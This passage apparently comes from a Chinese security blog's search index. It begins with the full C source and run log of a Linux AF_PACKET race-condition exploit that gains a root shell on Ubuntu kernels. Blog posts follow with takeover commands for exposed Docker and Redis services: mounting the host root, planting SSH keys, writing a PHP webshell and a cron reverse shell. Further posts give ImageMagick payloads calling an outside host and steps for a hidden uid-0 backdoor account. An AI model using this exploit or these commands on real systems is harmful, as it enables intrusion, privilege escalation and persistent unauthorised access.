arg=0xffffffffff600000sockets allocatedremoving barrier and spraying..version switcher stopping, x = -1 (y = 174222, last val = 2)current packet version = 0pbd-&gt;hdr.bh1.offset_to_first_pkt = 48*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.closing socket and verifying.......vsyscall page altered!stage 1 completedregistering new sysctl..new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850sockets allocatedremoving barrier and spraying..version switcher stopping, x = -1 (y = 30773, last val = 0)current packet version = 2pbd-&gt;hdr.bh1.offset_to_first_pkt = 48race not wonretrying stage..new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850sockets allocatedremoving barrier and spraying..version switcher stopping, x = -1 (y = 133577, last val = 2)current packet version = 0pbd-&gt;hdr.bh1.offset_to_first_pkt = 48*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.closing socket and verifying.......sysctl added!stage 2 completedbinary executed by kernel, launching rootshellroot@ubuntu:~# iduid=0(root) gid=0(root) groups=0(root),1000(user)*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=There are offsets included for older kernels, but they're untestedso be aware that this exploit will probably crash kernels older than 4.4.tested on:Ubuntu 16.04: 4.4.0-51-genericUbuntu 16.04: 4.4.0-47-genericUbuntu 16.04: 4.4.0-36-genericUbuntu 14.04: 4.4.0-47-generic #68~14.04.1-UbuntuShoutouts to:jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)mcdelivery for delivering hotcakes and coffee11/2016by rebel*/#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;assert.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;poll.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netinet/if_ether.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/stat.h&gt;#include &lt;linux/if_packet.h&gt;#include &lt;pthread.h&gt;#include &lt;linux/sched.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;signal.h&gt;#include &lt;sched.h&gt;#include &lt;sys/utsname.h&gt;volatile int barrier = 1;volatile int vers_switcher_done = 0;struct offset &#123; char *kernel_version; unsigned long proc_dostring; unsigned long modprobe_path; unsigned long register_sysctl_table; unsigned long set_memory_rw;&#125;;struct offset *off = NULL;//99% of these offsets haven't actually been tested :)struct offset offsets[] = &#123; &#123;"4.4.0-46-generic #67~14.04.1",0xffffffff810842f0,0xffffffff81e4b100,0xffffffff81274580,0xffffffff8106b880&#125;, &#123;"4.4.0-47-generic #68~14.04.1",0,0,0,0&#125;, &#123;"4.2.0-41-generic #48",0xffffffff81083470,0xffffffff81e48920,0xffffffff812775c0,0xffffffff8106c680&#125;, &#123;"4.8.0-22-generic #24",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b34b0,0xffffffff8106f0d0&#125;, &#123;"4.2.0-34-generic #39",0xffffffff81082080,0xffffffff81c487e0,0xffffffff81274490,0xffffffff8106b5d0&#125;, &#123;"4.2.0-30-generic #36",0xffffffff810820d0,0xffffffff81c487e0,0xffffffff812744e0,0xffffffff8106b620&#125;, &#123;"4.2.0-16-generic #19",0xffffffff81081ac0,0xffffffff81c48680,0xffffffff812738f0,0xffffffff8106b110&#125;, &#123;"4.2.0-17-generic #21",0,0,0,0&#125;, &#123;"4.2.0-18-generic #22",0,0,0,0&#125;, &#123;"4.2.0-19-generic #23~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125de30,0xffffffff81067750&#125;, &#123;"4.2.0-21-generic #25~14.04.1",0,0,0,0&#125;, &#123;"4.2.0-30-generic #36~14.04.1",0xffffffff8107da40,0xffffffff81c4a8e0,0xffffffff8125dd40,0xffffffff81067b20&#125;, &#123;"4.2.0-27-generic #32~14.04.1",0xffffffff8107dbe0,0xffffffff81c498c0,0xffffffff8125e420,0xffffffff81067c60&#125;, &#123;"4.2.0-36-generic #42",0xffffffff81083430,0xffffffff81e488e0,0xffffffff81277380,0xffffffff8106c680&#125;, &#123;"4.4.0-22-generic #40",0xffffffff81087d40,0xffffffff81e48f00,0xffffffff812864d0,0xffffffff8106f370&#125;, &#123;"4.2.0-18-generic #22~14.04.1",0xffffffff8107d620,0xffffffff81c49780,0xffffffff8125dd10,0xffffffff81067760&#125;, &#123;"4.4.0-34-generic #53",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286ed0,0xffffffff8106f370&#125;, &#123;"4.2.0-22-generic #27",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273b20,0xffffffff8106b100&#125;, &#123;"4.2.0-23-generic #28",0,0,0,0&#125;, &#123;"4.2.0-25-generic #30",0,0,0,0&#125;, &#123;"4.4.0-36-generic #55",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e50,0xffffffff8106f360&#125;, &#123;"4.2.0-42-generic #49",0xffffffff81083490,0xffffffff81e489a0,0xffffffff81277870,0xffffffff8106c680&#125;, &#123;"4.4.0-31-generic #50",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e90,0xffffffff8106f370&#125;, &#123;"4.4.0-22-generic #40~14.04.1",0xffffffff81084250,0xffffffff81c4b080,0xffffffff81273de0,0xffffffff8106b9d0&#125;, &#123;"4.2.0-38-generic #45",0xffffffff810833d0,0xffffffff81e488e0,0xffffffff81277410,0xffffffff8106c680&#125;, &#123;"4.4.0-45-generic #66",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874c0,0xffffffff8106f320&#125;, &#123;"4.2.0-36-generic #42~14.04.1",0xffffffff8107ffd0,0xffffffff81c499e0,0xffffffff81261ea0,0xffffffff81069d00&#125;, &#123;"4.4.0-45-generic #66~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274340,0xffffffff8106b880&#125;, &#123;"4.2.0-22-generic #27~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125deb0,0xffffffff81067750&#125;, &#123;"4.2.0-25-generic #30~14.04.1",0,0,0,0&#125;, &#123;"4.2.0-23-generic #28~14.04.1",0,0,0,0&#125;, &#123;"4.4.0-46-generic #67",0xffffffff81088040,0xffffffff81e48f80,0xffffffff81287800,0xffffffff8106f320&#125;, &#123;"4.4.0-47-generic #68",0,0,0,0&#125;, &#123;"4.4.0-34-generic #53~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c40,0xffffffff8106b880&#125;, &#123;"4.4.0-36-generic #55~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c60,0xffffffff8106b890&#125;, &#123;"4.4.0-31-generic #50~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c20,0xffffffff8106b880&#125;, &#123;"4.2.0-38-generic #45~14.04.1",0xffffffff8107fdc0,0xffffffff81c4a9e0,0xffffffff81261540,0xffffffff81069bf0&#125;, &#123;"4.2.0-35-generic #40",0xffffffff81083430,0xffffffff81e48860,0xffffffff81277240,0xffffffff8106c680&#125;, &#123;"4.4.0-24-generic #43~14.04.1",0xffffffff81084120,0xffffffff81c4b080,0xffffffff812736f0,0xffffffff8106b880&#125;, &#123;"4.4.0-21-generic #37",0xffffffff81087cf0,0xffffffff81e48e80,0xffffffff81286310,0xffffffff8106f370&#125;, &#123;"4.2.0-34-generic #39~14.04.1",0xffffffff8107dc50,0xffffffff81c498e0,0xffffffff8125e830,0xffffffff81067c90&#125;, &#123;"4.4.0-24-generic #43",0xffffffff81087e60,0xffffffff81e48f00,0xffffffff812868f0,0xffffffff8106f370&#125;, &#123;"4.4.0-21-generic #37~14.04.1",0xffffffff81084220,0xffffffff81c4b000,0xffffffff81273a30,0xffffffff8106b9d0&#125;, &#123;"4.2.0-41-generic #48~14.04.1",0xffffffff8107fe20,0xffffffff81c4aa20,0xffffffff812616c0,0xffffffff81069bf0&#125;, &#123;"4.8.0-27-generic #29",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b3490,0xffffffff8106f0d0&#125;, &#123;"4.8.0-26-generic #28",0,0,0,0&#125;, &#123;"4.4.0-38-generic #57",0xffffffff81087f70,0xffffffff81e48f80,0xffffffff81287470,0xffffffff8106f360&#125;, &#123;"4.4.0-42-generic #62~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274300,0xffffffff8106b880&#125;, &#123;"4.4.0-38-generic #57~14.04.1",0xffffffff81084210,0xffffffff81e4b100,0xffffffff812742e0,0xffffffff8106b890&#125;, &#123;"4.4.0-49-generic #70",0xffffffff81088090,0xffffffff81e48f80,0xffffffff81287d40,0xffffffff8106f320&#125;, &#123;"4.4.0-49-generic #70~14.04.1",0xffffffff81084350,0xffffffff81e4b100,0xffffffff81274b10,0xffffffff8106b880&#125;, &#123;"4.2.0-21-generic #25",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273aa0,0xffffffff8106b100&#125;, &#123;"4.2.0-19-generic #23",0,0,0,0&#125;, &#123;"4.2.0-42-generic #49~14.04.1",0xffffffff8107fe20,0xffffffff81c4aaa0,0xffffffff81261980,0xffffffff81069bf0&#125;, &#123;"4.4.0-43-generic #63",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874b0,0xffffffff8106f320&#125;, &#123;"4.4.0-28-generic #47",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286df0,0xffffffff8106f370&#125;, &#123;"4.4.0-28-generic #47~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273b70,0xffffffff8106b880&#125;, &#123;"4.9.0-1-generic #2",0xffffffff8108bbe0,0xffffffff81e4ac20,0xffffffff812b8400,0xffffffff8106f390&#125;, &#123;"4.8.0-28-generic #30",0xffffffff8108ae10,0xffffffff81e48b80,0xffffffff812b3690,0xffffffff8106f0e0&#125;, &#123;"4.2.0-35-generic #40~14.04.1",0xffffffff8107fff0,0xffffffff81c49960,0xffffffff81262320,0xffffffff81069d20&#125;, &#123;"4.2.0-27-generic #32",0xffffffff810820c0,0xffffffff81c487c0,0xffffffff81274150,0xffffffff8106b620&#125;, &#123;"4.4.0-42-generic #62",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874a0,0xffffffff8106f320&#125;, &#123;"4.4.0-51-generic #72",0xffffffff81088090,0xffffffff81e48f80,0xffffffff812879a0,0xffffffff8106f320&#125;,//&#123;"4.8.6-300.fc25.x86_64 #1 SMP Tue Nov 1 12:36:38 UTC 2016",0xffffffff9f0a8b30,0xffffffff9fe40940,0xffffffff9f2cfbf0,0xffffffff9f0663b0&#125;, &#123;NULL,0,0,0,0&#125;&#125;;#define VSYSCALL 0xffffffffff600000#define PAD 64int pad_fds[PAD];struct ctl_table &#123; const char *procname; void *data; int maxlen; unsigned short mode; struct ctl_table *child; void *proc_handler; void *poll; void *extra1; void *extra2;&#125;;#define CONF_RING_FRAMES 1struct tpacket_req3 tp;int sfd;int mapped = 0;struct timer_list &#123; void *next; void *prev; unsigned long expires; void (*function)(unsigned long); unsigned long data; unsigned int flags; int slack;&#125;;void *setsockopt_thread(void *arg)&#123; while(barrier) &#123; &#125; setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &amp;tp, sizeof(tp)); return NULL;&#125;void *vers_switcher(void *arg)&#123; int val,x,y; while(barrier) &#123;&#125; while(1) &#123; val = TPACKET_V1; x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, sizeof(val)); y++; if(x != 0) break; val = TPACKET_V3; x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, sizeof(val)); if(x != 0) break; y++; &#125; fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val); vers_switcher_done = 1; return NULL;&#125;#define BUFSIZE 1408char exploitbuf[BUFSIZE];void kmalloc(void)&#123; while(1) syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);&#125;void pad_kmalloc(void)&#123; int x; for(x=0; x&lt;PAD; x++) if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) &#123; fprintf(stderr,"pad_kmalloc() socket error\n"); exit(1); &#125;&#125;int try_exploit(unsigned long func, unsigned long arg, void *verification_func)&#123; pthread_t setsockopt_thread_thread,a; int val; socklen_t l; struct timer_list *timer; int fd; struct tpacket_block_desc *pbd; int off; sigset_t set; sigemptyset(&amp;set); sigaddset(&amp;set, SIGSEGV); if(pthread_sigmask(SIG_BLOCK, &amp;set, NULL) != 0) &#123; fprintf(stderr,"couldn't set sigmask\n"); exit(1); &#125; fprintf(stderr,"new exploit attempt starting, jumping to %p, arg=%p\n",(void *)func,(void *)arg); pad_kmalloc(); fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)); if (fd==-1) &#123; printf("target socket error\n"); exit(1); &#125; pad_kmalloc(); fprintf(stderr,"sockets allocated\n"); val = TPACKET_V3; setsockopt(fd, SOL_PACKET, PACKET_VERSION, &amp;val, sizeof(val)); tp.tp_block_size = CONF_RING_FRAMES * getpagesize(); tp.tp_block_nr = 1; tp.tp_frame_size = getpagesize(); tp.tp_frame_nr = CONF_RING_FRAMES;//try to set the timeout to 10 seconds//the default timeout might still be used though depending on when the race was won tp.tp_retire_blk_tov = 10000; sfd = fd; if(pthread_create(&amp;setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) &#123; fprintf(stderr, "Error creating thread\n"); return 1; &#125; pthread_create(&amp;a, NULL, vers_switcher, (void *)NULL); usleep(200000); fprintf(stderr,"removing barrier and spraying..\n"); memset(exploitbuf,'\x00',BUFSIZE); timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8); timer-&gt;next = 0; timer-&gt;prev = 0; timer-&gt;expires = 4294943360; timer-&gt;function = (void *)func; timer-&gt;data = arg; timer-&gt;flags = 1; timer-&gt;slack = -1; barrier = 0; usleep(100000); while(!vers_switcher_done)usleep(100000); l = sizeof(val); getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, &amp;l); fprintf(stderr,"current packet version = %d\n",val); pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0); if(pbd == MAP_FAILED) &#123; fprintf(stderr,"could not map pbd\n"); exit(1); &#125; else &#123; off = pbd-&gt;hdr.bh1.offset_to_first_pkt; fprintf(stderr,"pbd-&gt;hdr.bh1.offset_to_first_pkt = %d\n",off); &#125; if(val == TPACKET_V1 &amp;&amp; off != 0) &#123; fprintf(stderr,"*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*\n"); &#125; else &#123; fprintf(stderr,"race not won\n"); exit(2); &#125; munmap(pbd, tp.tp_block_size * tp.tp_block_nr); pthread_create(&amp;a, NULL, verification_func, (void *)NULL); fprintf(stderr,"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n"); sleep(1); fprintf(stderr,"closing socket and verifying.."); close(sfd); kmalloc(); fprintf(stderr,"all messages sent\n"); sleep(31337); exit(1);&#125;int verification_result = 0;void catch_sigsegv(int sig)&#123; verification_result = 0; pthread_exit((void *)1);&#125;void *modify_vsyscall(void *arg)&#123; unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850); unsigned long x = (unsigned long)arg; sigset_t set; sigemptyset(&amp;set); sigaddset(&amp;set, SIGSEGV); if(pthread_sigmask(SIG_UNBLOCK, &amp;set, NULL) != 0) &#123; fprintf(stderr,"couldn't set sigmask\n"); exit(1); &#125; signal(SIGSEGV, catch_sigsegv); *vsyscall = 0xdeadbeef+x; if(*vsyscall == 0xdeadbeef+x) &#123; fprintf(stderr,"\nvsyscall page altered!\n"); verification_result = 1; pthread_exit(0); &#125; return NULL;&#125;void verify_stage1(void)&#123; int x; pthread_t v_thread; sleep(5); for(x=0; x&lt;300; x++) &#123; pthread_create(&amp;v_thread, NULL, modify_vsyscall, 0); pthread_join(v_thread, NULL); if(verification_result == 1) &#123; exit(0); &#125; write(2,".",1); sleep(1); &#125; printf("could not modify vsyscall\n"); exit(1);&#125;void verify_stage2(void)&#123; int x; struct stat b; sleep(5); for(x=0; x&lt;300; x++) &#123; if(stat("/proc/sys/hack",&amp;b) == 0) &#123; fprintf(stderr,"\nsysctl added!\n"); exit(0); &#125; write(2,".",1); sleep(1); &#125; printf("could not add sysctl\n"); exit(1);&#125;void exploit(unsigned long func, unsigned long arg, void *verification_func)&#123; int status; int pid;retry: pid = fork(); if(pid == 0) &#123; try_exploit(func, arg, verification_func); exit(1); &#125; wait(&amp;status); printf("\n"); if(WEXITSTATUS(status) == 2) &#123; printf("retrying stage..\n"); kill(pid, 9); sleep(2); goto retry; &#125; else if(WEXITSTATUS(status) != 0) &#123; printf("something bad happened, aborting exploit attempt\n"); exit(-1); &#125; kill(pid, 9);&#125;void wrapper(void)&#123; struct ctl_table *c; fprintf(stderr,"exploit starting\n"); printf("making vsyscall page writable..\n\n"); exploit(off-&gt;set_memory_rw, VSYSCALL, verify_stage1); printf("\nstage 1 completed\n"); sleep(5); printf("registering new sysctl..\n\n"); c = (struct ctl_table *)(VSYSCALL+0x850); memset((char *)(VSYSCALL+0x850), '\x00', 1952); strcpy((char *)(VSYSCALL+0xf00),"hack"); memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4); c-&gt;procname = (char *)(VSYSCALL+0xf00); c-&gt;mode = 0666; c-&gt;proc_handler = (void *)(off-&gt;proc_dostring); c-&gt;data = (void *)(off-&gt;modprobe_path); c-&gt;maxlen=256; c-&gt;extra1 = (void *)(VSYSCALL+0xe00); c-&gt;extra2 = (void *)(VSYSCALL+0xd00); exploit(off-&gt;register_sysctl_table, VSYSCALL+0x850, verify_stage2); printf("stage 2 completed\n");&#125;void launch_rootshell(void)&#123; int fd; char buf[256]; struct stat s; fd = open("/proc/sys/hack",O_WRONLY); if(fd == -1) &#123; fprintf(stderr,"could not open /proc/sys/hack\n"); exit(-1); &#125; memset(buf,'\x00', 256); readlink("/proc/self/exe",(char *)&amp;buf,256); write(fd,buf,strlen(buf)+1); socket(AF_INET,SOCK_STREAM,132); if(stat(buf,&amp;s) == 0 &amp;&amp; s.st_uid == 0) &#123; printf("binary executed by kernel, launching rootshell\n"); lseek(fd, 0, SEEK_SET); write(fd,"/sbin/modprobe",15); close(fd); execl(buf,buf,NULL); &#125; else printf("could not create rootshell\n");&#125;int main(int argc, char **argv)&#123; int status, pid; struct utsname u; int i, crash = 0; char buf[512], *f; if(argc == 2 &amp;&amp; !strcmp(argv[1],"crash")) &#123; crash = 1; &#125; if(getuid() == 0 &amp;&amp; geteuid() == 0 &amp;&amp; !crash) &#123; chown("/proc/self/exe",0,0); chmod("/proc/self/exe",06755); exit(-1); &#125; else if(getuid() != 0 &amp;&amp; geteuid() == 0 &amp;&amp; !crash) &#123; setresuid(0,0,0); setresgid(0,0,0); execl("/bin/bash","bash","-p",NULL); exit(0); &#125; fprintf(stderr,"linux AF_PACKET race condition exploit by rebel\n"); uname(&amp;u); if((f = strstr(u.version,"-Ubuntu")) != NULL) *f = '\0'; snprintf(buf,512,"%s %s",u.release,u.version); printf("kernel version: %s\n",buf); for(i=0; offsets[i].kernel_version != NULL; i++) &#123; if(!strcmp(offsets[i].kernel_version,buf)) &#123; while(offsets[i].proc_dostring == 0) i--; off = &amp;offsets[i]; break; &#125; &#125; if(crash) &#123; off = &amp;offsets[0]; off-&gt;set_memory_rw = 0xffffffff41414141; &#125; if(off) &#123; printf("proc_dostring = %p\n",(void *)off-&gt;proc_dostring); printf("modprobe_path = %p\n",(void *)off-&gt;modprobe_path); printf("register_sysctl_table = %p\n",(void *)off-&gt;register_sysctl_table); printf("set_memory_rw = %p\n",(void *)off-&gt;set_memory_rw); &#125; if(!off) &#123; fprintf(stderr,"i have no offsets for this kernel version..\n"); exit(-1); &#125; pid = fork(); if(pid == 0) &#123; if(unshare(CLONE_NEWUSER) != 0) fprintf(stderr, "failed to create new user namespace\n"); if(unshare(CLONE_NEWNET) != 0) fprintf(stderr, "failed to create new network namespace\n"); wrapper(); exit(0); &#125; waitpid(pid, &amp;status, 0); launch_rootshell(); return 0;&#125;]]></content>
      <tags>
        <tag>Vulnerability</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git基本使用]]></title>
    <url>%2F2016%2F09%2F18%2FGit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[GitHub是一个面向开源及私有软件项目的托管平台用GitHub备份一些代码，记录一些基本使用 建立远程仓库首先新建立一个仓库 设置远程仓库的名字，然后创建 建立本地仓库建立目录，或进入想建立的目录，将文件夹初始化为一个Git可以管理的仓库 1git init 常用命令与远程仓库关联1git remote add origin git@github.com:jeffzh3ng/KIT.git 同步到远程仓库添加当前目录的所有文件到暂存区 1git add * //add *是添加本地仓库全部文件 提交暂存区到仓库区1git commit -m "message" 显示有变更的文件1git status 上传本地指定分支到远程仓库1git push origin master 克隆远程仓库1git https://github.com/jeffzh3ng/KIT.git 参考链接常用Git命令清单 Git-简明指南 Git命令大全]]></content>
      <tags>
        <tag>GitHub</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker Remote API未授权访问漏洞]]></title>
    <url>%2F2016%2F08%2F18%2FDocker-Remote-API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Docker是一个开源的应用容器引擎，允许开发者将其应用和依赖包打包到一个可移植的容器中，并发布到任何流行的Linux机器上，以实现虚拟化 漏洞描述Docker的Remote API因配置不当可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可访问到Docker数据，可能导致敏感信息泄露，黑客也可以恶意删除Docker上的数据；攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器 漏洞利用访问http请求curl x.x.x.x:2375/info如果返回码200，并且返回DockerRootDir等字符，则证明存在目标存在未授权访问漏洞。查看以有镜像列表 1docker -H tcp://0.0.0.0:2375 images 如果不存在镜像，可主动pull一个，其中默认存在的镜像中busybox体积最小，这里拿Ubuntu举例。 1docker -H tcp://0.0.0.0:2375 pull ubuntu 运行容器并挂载系统根目录（/）。该命令将宿主根目录（/）挂载到容器中/mnt目录下，所有操作在mnt目录下进行。 1docker -H tcp://0.0.0.0:2375 run -v /:/mnt -ti ubuntu /bin/bash 生成ssh免密码登录key，得到id_rsa.pub文件 1ssh-keygen –t rsa –C "root" 替换对应/mnt/root/.ssh/authorized_keys文件内容。（测试过程记得保存原始）直接ssh登录即可。 漏洞修复修改Docker Remote API服务默认参数注意：该操作需要重启Docker服务才能生效修改Docker的启动参数：定位到DOCKER_OPTS中的tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1或将默认端口2375改为自定义端口 为Remote API设置认证措施参照官方文档配置Remote API的认证措施注意：该操作需要重启Docker服务才能生效。修改Docker服务运行账号，请以较低权限账号运行Docker服务；另外，可以限制攻击者执行高危命令。注意：该操作需要重启Docker服务才能生效。 设置防火墙策略如果正常业务中API服务需要被其他服务器来访问，可以配置安全组策略或iptables策略，仅允许指定的IP来访问Docker接口。]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ImageMagick命令执行]]></title>
    <url>%2F2016%2F08%2F18%2FImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言。目前官方披露称，ImageMagick存在一处远程命令执行漏洞（CVE-2016–3714），当其处理的上传图片带有攻击代码时，可被远程执行任意代码，进而导致攻击者控制服务器 漏洞介绍命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。ImageMagick之所以支持那么多的文件格式，是因为它内置了非常多的图像处理库，对于这些图像处理库，ImageMagick给它起了个名字叫做Delegate(委托)，每个Delegate对应一种格式的文件，然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。 漏洞利用无法回显，通过反弹shell或者使用DNS Log来记录是否命令执行结果 ImageMagick popen()命令执行1234push graphic-contextviewbox 0 0 640 480image copy 200,200 100,100 "|wget http://imagemagick.rce.dnsrecord.tk/`id`"pop graphic-context ImageMagick远程命令执行漏洞（CVE-2016–3714）12345vi 1.svgpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|ping imagemagick.rce.dnsrecord.tk")'pop graphic-context]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu使用Kali软件源]]></title>
    <url>%2F2016%2F06%2F29%2FUbuntu%E4%BD%BF%E7%94%A8Kali%E8%BD%AF%E4%BB%B6%E6%BA%90%2F</url>
    <content type="text"><![CDATA[近期在上搭环境，用到大量的kali下的工具，一个个移植太麻烦。Ubuntu和Kali-Linux同样基于Debian，源可以共用。就考虑替换软件源来解决 替换源12deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib 导入公钥12gpg --keyserver pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6gpg -a --export ED444FF07D8D0BF6 | apt-key add - 更新系统1apt update &amp;&amp; apt upgrade -y 这里vps环境是ubuntu 16.04]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis未授权访问漏洞]]></title>
    <url>%2F2016%2F01%2F22%2FRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Redis是一套开源的使用ANSIC编写、支持网络、可基于内存亦可持久化的日志型、键值存储数据库，并提供多种语言的API。Redis默认情况下会开启6379端口，在未开启认证的情况下，可导致任意用户在可以访问目标服务器的情况下未授权访问Redis 漏洞介绍该漏洞在较早前就已经被发现，而近期研究者给出了更为危险的利用方法。Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。攻击者可利用Redis的相关方法，将自己的公钥写入目标服务器 /root/.ssh文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。 漏洞利用写文件向网站目录下写入WebShell 1234config set dir /var/www/htmlconfig set dbfilename webshell.phpset webshell "&lt;?php @eval($_POST[passwd]);?&gt;"save 写公钥向用户authorized_keys中写入公匙 123456789101112$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt$ redis-cli -h 192.168.1.1 flushall //慎重！$ cat foo.txt | redis-cli -h 192.168.1.1 -x set crackit$ redis-cli -h 192.168.1.1192.168.1.1:6379&gt; config set dir /Users/antirez/.ssh/OK192.168.1.1:6379&gt; config get dir1) "dir"2) "/Users/antirez/.ssh"192.168.1.1:6379&gt; config set dbfilename "authorized_keys"OK192.168.1.1:6379&gt; save 写Linux计划任务利用Linux的任务反弹shell，向/var/spool/cron写入计划任务，当Linux开启cron的时候，会定时去执行里面的任务 123456789echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/youip/2333 0&gt;&amp;1\n\n"|redis-cli -h 0.0.0.0 -x set 1orecho -e "\n\n*/1 * * * * echo "&lt;?php phpinofo();?&gt;" &gt;/var/www/html/webshell.php;crontab -r\n\n"|redis-cli -h host -x set 1redis-cli -h IP0.0.0.0:6379&gt; config set dir /var/spool/cronOK0.0.0.0:6379&gt; config set dbfilename rootOK0.0.0.0:6379&gt; save]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>Vulnerability</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[非交互式模式下添加用户]]></title>
    <url>%2F2015%2F12%2F05%2F%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[某次测试，用nc接收了一个shell，非交互式操作起来很多问题，shadow里的密码也解不开。只能添加临时一个用户，但非交互式添加的用户是没有密码，Linux默认没有密码无法登陆的。翻了一些资料，这里记录一些小的Tips 使用useradd添加账户密码username:password 1useradd -p `openssl passwd -1 -salt 'xxx' password` -u 0 -o -g root -G root -s /bin/bash -d /usr/bin/username username 开启允许空密码登录修改ssh配置文件允许空密码登陆，配置文件路径在/etc/ssh/sshd_config，修改PermitEmptyPasswords no为PermitEmptyPasswords yes即可 1sed -i 's/PermitEmptyPasswords no/PermitEmptyPasswords yes/g' /etc/ssh/sshd_config 修改用户密码直接使用chpasswd修改密码 1echo "username":"password" | chpasswd]]></content>
      <tags>
        <tag>Tips</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mimikatz使用Tips]]></title>
    <url>%2F2015%2F11%2F21%2FMimikatz%E4%BD%BF%E7%94%A8Tips%2F</url>
